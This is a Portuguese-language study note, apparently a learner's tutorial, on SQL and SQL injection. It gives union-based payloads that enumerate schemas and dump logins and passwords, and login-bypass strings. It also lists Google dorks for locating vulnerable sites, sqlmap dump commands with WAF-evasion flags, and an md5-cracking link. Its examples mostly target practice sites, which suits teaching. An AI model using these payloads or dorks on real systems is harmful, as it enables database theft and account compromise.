O que é SQL? é uma linguagem de programação. 
	->banco de dados feitos em SQL: msql, postgresql, sqlserver, oracle
	->Comandos de consultas no banco de dados: 
	
		- > SELECT - seleciona dados < -
		- > DELETE - deleta dados    < -
		- > UPDATE - atualiza dados  < -
		- > INSERT - insere dados    < -

Exemplo de uso de um banco de dados msql: 
	- >show databases; retorna o banco de dados do servidor 
	ex : 
		------------------------
			Database 
		------------------------
		+algumacoisa1 
		+algumacoisa2 
		+algumacoisa3 
	
	- > use algumacoisa1; ( "use o bancodedados algumacoisa1" ) e ele usará o banco de dados escolhido 
	- > show tables; ( retornará as tabelas que aquele banco de dados possui 
	ex:
		------------------------
		    tables_no_banco
		------------------------ 
		+users 
		+pictures 
		+categories
		+stats 
		
	- > select * from users; ( return tudo que uma table possui ) 
		id teste 
		--------------------------------------
		1 users: <p> cristina_do_arrocha </p>
		--------------------------------------
		2 emails: <p> email: cristina@teste.com </p>
	- > select * from users where teste="emails"; 
		id teste 
		------------------------------------
		2 emails: <p> email: cristina@teste.com </p>

- > pegamos agora a url http://www.bancocn.com/cat.php?id=1 como exemplo. < - 

- > ( Injeção SQL )
 - É uma falha que explora o tratamento de entrada nos formulários através da manipulação de parâmetros da URL (GET) ou formulários (POST), os quais enviam informações que alimentam o bando de dados SQL.
 - Conteúdo injetado: 
	', 
   -------------------------------------------------	 TIPOS DE SQLinjection:      ----------------------------------------------------- 

1 ) IN-BAND SQLi (SQLI Clássico)
	-> feito diretamente na url.


2 ) Union 
	- > nesse ataque o atacante vai unir ( combinar ) diferentes injeções 
	exemplo: 
		fazendo injeção na url 
		cat.php?id = 1 order by 1-- ( -- é um comentário ) 
		cat.php?id = 1 order by 2--
		order by ( ordene pela coluna )
		ordene pela coluna by x* até retornar: Unknown column 'x*' in 'order clause' ( assim, você saberá quantas colunas aquele banco de dados possui ) 
		
	observação: No exemplo supracitado, é o mesmo que fazer uma consulta no banco de dados:  
	
	Como seria a consulta no banco de dados: 					
	
	1 ) show databases; ( mostre os banco de dados ) 
	2 ) use algumacoisa1; ( use o banco de dados escolhido ) 
	3 ) show tables; ( mostre as tabelas que o banco escolhido possui ) 
	
	- > select * from users where teste="emails"; 				- > select * from users order by 2 
		return 									return
		
		id teste				      	OR  			id teste 
		------------------------------------					---------------------------------------
		2 emails: <p> email: cristina@teste.com </p>				2 emails: <p> email: cristina@teste.com </p>


	- > Feito os passos a cima iremos fazer um ataque baseado em union: 
		fazendo injeção na url: 
			
			cat.php?id = 1 union select 1		
			observação: 1 union select 1, 2, 3, 4... ( também é uma forma de descobrir quantas colunas o banco de dados possui ) 
			
			Por que é um ataque baseado em union ? 
				usamos 2 select. O primeiro é usado pela próprio url pra fazer requisição no banco de dados e o segundo que passamos 				manualmente.
			return
	  	You have an error in your SQL syntax; 

	observação: No exemplo supracitado, é o mesmo que fazer uma consulta no banco de dados: 
	
	Como seria a consulta no banco de dados:
	1 ) show databases; 
	2 ) use algumacoisa1;
	3 ) show tables;
											
	- > select * from users union select 2;				   ==				Na url: 
											  	  		1 union select 2; 
		return 
		
		id teste						 
		-------------------------------------------
		2 emails: <p> email: cristina@teste.com </p>
	obs: Ao usar 1 u
	------------------------------------------------------------------------------------------------------------------------------------------
	- > Descobrir o nome do banco de dados, tabelas e colunas usando ataque em union ( combinação de parâmetros )
		- 1 union select 2, database() 
		- 1 union select 2, schema_name from information_schema.schemata
		- 1 union select 2, group_concat(schema_name) from information_schema.schemata retorna todos os bancos de dados ( se não retornar, o 		atacante não tem privilégios suficientes para fazer )   
		-1 union select 2, group_concat(table_name) from information_schema.tables where table_schema="nome do bancoc" ( retorna tabelas do que o banco de dados possui ) 
		-1 union select 2, group_concat(column_name) from information_schema.columns where table_schema="nome do bancoc" and table_name="tabela"
	
	- > após saber o nome do banco de dados, tabelas e colunas podemos retornar ao ataque union e combinar parâmetros:
	cat.php?id=-1 union select 2, group_concat(id, ".",login, ".",password) from bancocn.users
	group_concat ( retorne tudo ) 
	from bancocn.users - do banco de dados x e das tableas y
	
	return login and password 
	
		
	- > Como seria a consulta feita no banco de dados msql: 
		- use information_schema;
		- select * from schemata; 
	
	
	
-------------------------------------------------------------------------------------------------------------------------------------------
3 ) Error-based SQLi ( ataque baseado no erro ) 
	-> No ambiente de produção ( usuário final ), ou seja, o produto final de um programa para o cliente terá que retornar o mínimo de erros possiveis.
	Neste tipo de ataque, é analisado todos os erros retornados a fim de obter informações sensíveis do banco de dados. 
	
	ex: dominio/cat.php?id=1        dominio/cat.php?id='
	    dominio/cat.php?id=2	dominio/cat.php?id='
	    dominio/cat.php?id=3 	dominio/cat.php?id='
	dominio/cat.php?id='teste
	* passagem de parametros por id 

	return 
		"you have an error in your SQL syntax" 
		"you have an error in your SQL syntax 'teste' --- > o parametro teste foi injetado 
	observação: os parametros passados por id não significa que o site é vulnerável (é funcionamento normal de um site) ou não, depende do programador. 
	usando google dorks ( google hacking ) para tentar pesquisar sites vulneráveis.
	exemplos:
		inurl:'.php?id=' 
		inurl:'.asp?id='
		inurl:'.aspx?id='
	
4 ) inferential SQLi (Blind SQLi)
	-> análise do comportamento da resposta do servidor.

5 ) Boolean-based Blind SQLi
	-> resposta do servidor baseadas em SIM OU NÃO, 0 ou 1, TRUE OR FALSE. E, através das respostas fazer uma analise da resposta do servidor. 

6 ) Time-based Blind SQLi 
	-> nesse tipo de ataque é analisado o tempo de resposta do servidor. 
	resposta imediata: False
	resposta demorada: True
	( é necessário automação ) 
	
7 ) Out-of-band SQLi 
	-> É o ataque menos comum. É um ataque de pós exploração. O servidor atuará como cliente e o atacante atuará como servidor. 
	
	
	
--- > aprender sql para iniciantes < ---
	- > https://www.codecademy.com/catalog/language/sql
	- > https://www.sqlcourse.com/beginner-course/
	
-> Quebrar senhas md5 	
#https://md5decrypt.net/en/

-> ferramentas para explorar vulnerabilidade sqlinjection 
	1) sqlmap 
	- Como usar? 
	ex url: http://testphp.vulnweb.com/login.php 
	
	sqlmap -r header.txt --dbs --dbms=mysql (tipo de banco, mysql, por exemplo, caso tenha essa informação extraída pelos ensinamentos supracitados) 
	-r passe um arquivo.txt e nele coloque informações relativas a:
	
	GET /login.php HTTP/1.1
	Host: url do site
	User-Agent: xxxxx
	Cookies: xxxxx

--dbs é para a descoberta de banco de dados 
--dbms=mysql é para tornar o ataque mais rápido quando você conhece a linguagem que o banco de dados utiliza 
	
	sqlmap -r header.txt --dbms=mysql -D (nome do banco de dados) --tables (pegar a tabela que o banco de dados possui)
	+users 
	+pictures 
	+categories
	+stats 
	
	sqlmap -r header.txt --dbms=mysql -D (nome do banco de dados) -T users --columns 
	id teste 
		--------------------------------------
		1 users: <p> cristina_do_arrocha </p>
		--------------------------------------
		2 emails: <p> email: cristina@teste.com </p>
		--------------------------------------
		3 passwords: 
	sqlmap -r header.txt --dbms=mysql -D (nome do banco de dados) -T users -C emails, passwords --dump 
	

	---------------------------------------	 	SQLinjection em formulários        ----------------------------------------------
	
	site teste: http://testphp.vulnweb.com/login.php
	
	formulário: 						injetando códigos ( aspas simples or duas aspas simples igual a aspas simples ) 
		usuário: xxx   ------------------ > 		'or''='         ' OR 1=1; --      
		login: xxx     ------------------ > 		'or''='		'=' 
										
	
	BYPASS 
	
	POST /login.php /HTTP1.1		-- > 	sqlmap -r header.txt --forms --dbs --dbms=(nome da linguagem do banco de dados) 
	Host: url do site
	User-Agent: xxxxx
	Cookies: xxxxx
	Content-Type: text/html; charset=UTF-8
	POST /login.php HTTP/1.1
	csrf-token 
	
	sqlinjection sem precisar passar um header: 
	sqlmap -u site --forms --dbms=(nome do banco de dados) --dbs 


	       ------------------------------------  Manipulando headers para SQLinjection  -------------------------------------

	#https://en.wikipedia.org/wiki/List_of_HTTP_header_fields
	#https://developer.mozilla.org/pt-BR/docs/Web/HTTP/Headers
	
	Roteamento de mensagens (Proxies)
	Como saber se o servidor está usando algum desses headers para armazenar informações do cliente? 
	Para linha de aprendizagem, vamos utilizar o burpsuit junto ao sqlmap para ver como as requisições estão sendo feitas: 
	
	--proxy=http://127.0.0.1:8080
	
	Forwarded
	X-Forwarded-For Non-Standard - > Utilizado quando o site passa por um proxy reverso ou firewall. 
	X-Forwarded-Host Non-Standard
	X-Forwarded-Proto Non-Standard
	
	
	Exemplo: 
	Onde estará presente o X-Forwarded-for ? provavelmente, em sites que usam proxies.
	X-Forwarded-For: 
	 
	   IPcliente  ----------------------- > proxie reverso / balanceador de carga / firewall  ------------------------ > Servidor  
	192.168.100.2 ----------------------- > 	      200.200.250.250	   	------------------------- >    200.200.250.250 
	X-Forwarded-for					      X-Forwarded-for 
	
	O servidor recebe uma conexão do proxie/firewall. O ip do cliente é isolado e adicionado no X-Forwarded-for e passaado para o site para ele saber quem se conectou. 
	nano header.txt 
	
	GET /login.php HTTP/1.1
	Host: url do site
	User-Agent: xxxxx
	Cookies: xxxxx
	X-Forwarded-For: xxx
	X-Forwarded-Host: xxx
	
	sqlmap -r header.txt -p X-Forwarded-For --dbs --dbms=mysql, caso o banco seja mysql, mas poderia ser postgresql, sqlserver, oracle... --no-cast 
	-p -> parâmetro que vc quer tentar fazer a injeção de códigos. ( no caso faremos no header ) 
	
	--no-cast -> diminuir o tamanho do payload, para ajudar a não ser identificado pelos WAF
	--tamper=script
	#https://github.com/sqlmapproject/sqlmap/tree/master/tamper - > scripts que o sqlmap possui.
	
	--risk=3 --level=5 - > aumentar os testes e "agressividade" do sqlmap aumentando a possibilidade do ataque de ser visto.
	--skip-waf - > desativa o scanner que o sqlmap faz do waf por padrão. 
	--is-dba

 ---------------------------------------------- 						------------------------------------------------------
